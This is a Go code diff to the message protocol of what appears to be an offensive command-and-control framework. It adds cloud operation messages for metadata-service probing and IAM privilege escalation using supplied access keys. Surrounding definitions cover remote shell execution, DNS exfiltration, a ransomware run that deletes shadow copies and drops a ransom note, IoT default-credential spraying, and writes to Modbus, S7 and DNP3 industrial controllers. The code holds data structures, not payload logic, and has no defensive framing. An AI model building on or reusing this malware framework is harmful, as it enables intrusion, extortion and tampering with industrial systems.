@@ -50,6 +50,8 @@ const (
 	TypeIoTCredsData  MessageType = "iotcreds_data"
 	TypeIcsStart      MessageType = "ics_start"
 	TypeIcsData       MessageType = "ics_data"
+	TypeCloudStart    MessageType = "cloud_start"
+	TypeCloudData     MessageType = "cloud_data"
 	TypeWirelessStop  MessageType = "wireless_stop"
 	TypeWirelessData  MessageType = "wireless_data"
 	TypeWirelessDone  MessageType = "wireless_done"
@@ -84,8 +86,9 @@ type Beacon struct {
 // Task is a command the core wants the agent to run.
 //
 // Kind distinguishes how the agent should handle it:
-//   "shell"     — exec.Command(Cmd, Args...)
-//   "framework" — dispatch to an internal Go function named Cmd with Args
+//
+//	"shell"     — exec.Command(Cmd, Args...)
+//	"framework" — dispatch to an internal Go function named Cmd with Args
 type Task struct {
 	ID      string   `json:"id"`
 	Kind    string   `json:"kind,omitempty"`
@@ -116,7 +119,6 @@ type ErrorReport struct {
 	TaskID  string `json:"task_id,omitempty"`
 	Message string `json:"message"`
 }
-
 
 // TunnelOpen is sent by core to ask the agent to dial (host:port).
 type TunnelOpen struct {
@@ -150,12 +152,11 @@ type TunnelFail struct {
 	Error    string `json:"error"`
 }
 
-
 // CaptureStart asks the agent to begin a packet capture on iface.
 type CaptureStart struct {
 	SessionID string `json:"session_id"`
 	Iface     string `json:"iface"`
-	Filter    string `json:"filter,omitempty"` // optional BPF, agent-side only supports "any" for now
+	Filter    string `json:"filter,omitempty"`  // optional BPF, agent-side only supports "any" for now
 	Snaplen   int    `json:"snaplen,omitempty"` // 0 = full frames
 }
 
@@ -167,7 +168,7 @@ type CaptureStop struct {
 // CaptureData is one chunk of captured frames.
 type CaptureData struct {
 	SessionID string `json:"session_id"`
-	Data      []byte `json:"data"` // chunk of pcap-format bytes
+	Data      []byte `json:"data"`  // chunk of pcap-format bytes
 	Count     int    `json:"count"` // number of frames in this chunk
 }
 
@@ -183,7 +184,6 @@ type CaptureFail struct {
 	SessionID string `json:"session_id"`
 	Error     string `json:"error"`
 }
-
 
 // DNSExfilChunk is metadata about one DNS exfil payload. The actual bytes
 // travel in DNS query labels; this struct is only used to route the decoded
@@ -201,7 +201,6 @@ type DNSExfilDone struct {
 	Bytes     int64  `json:"bytes"`
 	Chunks    int    `json:"chunks"`
 }
-
 
 // WirelessStart asks the agent to begin an 802.11 capture.
 type WirelessStart struct {
@@ -233,9 +232,6 @@ type WirelessDone struct {
 type WirelessFail struct {
 	SessionID string `json:"session_id"`
 	Error     string `json:"error"`
-
-
-
 }
 
 // CryptoStart kicks off a ransomware run on an agent. The agent encrypts
@@ -243,11 +239,11 @@ type WirelessFail struct {
 // note. Progress and result come back as CryptoData messages.
 type CryptoStart struct {
 	SessionID string `json:"session_id"`
-	Root      string `json:"root"`       // directory to walk
-	KeyID     uint32 `json:"key_id"`     // which operator key the wrapped AES keys target
-	DryRun    bool   `json:"dry_run"`    // enumerate + report, write nothing
-	KillVSS   bool   `json:"kill_vss"`   // run the shadow-copy stage
-	Note      bool   `json:"note"`       // drop the ransom note
+	Root      string `json:"root"`     // directory to walk
+	KeyID     uint32 `json:"key_id"`   // which operator key the wrapped AES keys target
+	DryRun    bool   `json:"dry_run"`  // enumerate + report, write nothing
+	KillVSS   bool   `json:"kill_vss"` // run the shadow-copy stage
+	Note      bool   `json:"note"`     // drop the ransom note
 	// note parameters — required if Note is true
 	ContactEmail string `json:"contact_email"`
 	Address      string `json:"address"`
@@ -258,11 +254,11 @@ type CryptoStart struct {
 // CryptoData streams progress back to core.
 type CryptoData struct {
 	SessionID string `json:"session_id"`
-	Stage     string `json:"stage"`      // "walk", "encrypt", "shadow", "note", "done"
-	Path      string `json:"path"`       // current file, if applicable
-	Done      int64  `json:"done"`       // count of items processed
-	Total     int64  `json:"total"`      // total found (0 if unknown)
-	Bytes     int64  `json:"bytes"`      // bytes processed, running total
+	Stage     string `json:"stage"` // "walk", "encrypt", "shadow", "note", "done"
+	Path      string `json:"path"`  // current file, if applicable
+	Done      int64  `json:"done"`  // count of items processed
+	Total     int64  `json:"total"` // total found (0 if unknown)
+	Bytes     int64  `json:"bytes"` // bytes processed, running total
 	OK        bool   `json:"ok"`
 	Error     string `json:"error,omitempty"`
 }
@@ -272,8 +268,8 @@ type CryptoData struct {
 type KeyPush struct {
 	SessionID string `json:"session_id"`
 	Filename  string `json:"filename"`
-	Data      []byte `json:"data"`     // base64 over JSON
-	Mode      uint32 `json:"mode"`     // unix mode bits (0 = default 0600)
+	Data      []byte `json:"data"` // base64 over JSON
+	Mode      uint32 `json:"mode"` // unix mode bits (0 = default 0600)
 }
 
 // IoTCredsStart kicks off a default-credential spray on the agent.
@@ -281,9 +277,9 @@ type IoTCredsStart struct {
 	SessionID string `json:"session_id"`
 	Host      string `json:"host"`
 	Port      int    `json:"port"`
-	Protocol  string `json:"protocol"`  // http|https|telnet|ssh
-	Path      string `json:"path"`      // http only
-	Timeout   int    `json:"timeout"`   // seconds
+	Protocol  string `json:"protocol"` // http|https|telnet|ssh
+	Path      string `json:"path"`     // http only
+	Timeout   int    `json:"timeout"`  // seconds
 	StopFirst bool   `json:"stop_first"`
 }
 
@@ -305,39 +301,79 @@ type IoTCredsData struct {
 // to the selected protocol are ignored.
 type IcsStart struct {
 	SessionID string `json:"session_id"`
-	Protocol  string `json:"protocol"`   // modbus|s7|dnp3
+	Protocol  string `json:"protocol"` // modbus|s7|dnp3
 	Host      string `json:"host"`
 	Port      int    `json:"port"`
-	Action    string `json:"action"`     // scan|read|write|dump|info|integrity|poll
+	Action    string `json:"action"` // scan|read|write|dump|info|integrity|poll
 
 	// Modbus
-	Unit    uint8  `json:"unit"`
-	Func    byte   `json:"func"`        // MBFunc constant
-	Start   uint16 `json:"start"`
-	Count   uint16 `json:"count"`
-	Value   uint16 `json:"value"`       // for single-register write
-	Values  []uint16 `json:"values"`    // for multi-register write
-	Bool    bool   `json:"bool"`        // for coil write
+	Unit   uint8    `json:"unit"`
+	Func   byte     `json:"func"` // MBFunc constant
+	Start  uint16   `json:"start"`
+	Count  uint16   `json:"count"`
+	Value  uint16   `json:"value"`  // for single-register write
+	Values []uint16 `json:"values"` // for multi-register write
+	Bool   bool     `json:"bool"`   // for coil write
 
 	// S7
-	Area    byte   `json:"area"`        // S7Area constant
-	DB      uint16 `json:"db"`
-	Data    []byte `json:"data"`        // for S7 write
-	SZLID   uint16 `json:"szl_id"`      // for S7 SZL read
+	Area  byte   `json:"area"` // S7Area constant
+	DB    uint16 `json:"db"`
+	Data  []byte `json:"data"`   // for S7 write
+	SZLID uint16 `json:"szl_id"` // for S7 SZL read
 
 	// DNP3
-	Dest    uint16 `json:"dest"`
-	Src     uint16 `json:"src"`
-	Class   uint8  `json:"class"`
+	Dest  uint16 `json:"dest"`
+	Src   uint16 `json:"src"`
+	Class uint8  `json:"class"`
 }
 
 // IcsData streams progress / results back to core.
 type IcsData struct {
 	SessionID string `json:"session_id"`
-	Stage     string `json:"stage"`     // scan|read|write|result|done|error
+	Stage     string `json:"stage"` // scan|read|write|result|done|error
 	Message   string `json:"message"`
 	Detail    string `json:"detail,omitempty"`
 	OK        bool   `json:"ok"`
 	Done      bool   `json:"done"`
 }
 
+// CloudStart kicks off a cloud-provider operation on the agent.
+type CloudStart struct {
+	SessionID string `json:"session_id"`
+	Action    string `json:"action"` // probe|chain|identity|users|roles|simulate|driver
+
+	// IMDS probe
+	Cloud string `json:"cloud,omitempty"` // aws|gcp|azure
+
+	// IAM walk / driver
+	AccessKeyID     string `json:"access_key_id,omitempty"`
+	SecretAccessKey string `json:"secret_access_key,omitempty"`
+	SessionToken    string `json:"session_token,omitempty"`
+	Region          string `json:"region,omitempty"`
+
+	// simulate
+	PolicySourceArn string   `json:"policy_source_arn,omitempty"`
+	Actions         []string `json:"actions,omitempty"`
+
+	// driver
+	Driver       string `json:"driver,omitempty"`
+	TargetUser   string `json:"target_user,omitempty"`
+	TargetGroup  string `json:"target_group,omitempty"`
+	PolicyARN    string `json:"policy_arn,omitempty"`
+	VersionID    string `json:"version_id,omitempty"`
+	RoleARN      string `json:"role_arn,omitempty"`
+	SessionName  string `json:"session_name,omitempty"`
+	Password     string `json:"password,omitempty"`
+	PolicyName   string `json:"policy_name,omitempty"`
+	DurationSecs int    `json:"duration_secs,omitempty"`
+}
+
+// CloudData streams progress / results back to core.
+type CloudData struct {
+	SessionID string `json:"session_id"`
+	Stage     string `json:"stage"` // probe|identity|iam|simulate|driver|done|error
+	Message   string `json:"message"`
+	Detail    string `json:"detail,omitempty"`
+	OK        bool   `json:"ok"`
+	Done      bool   `json:"done"`
+}
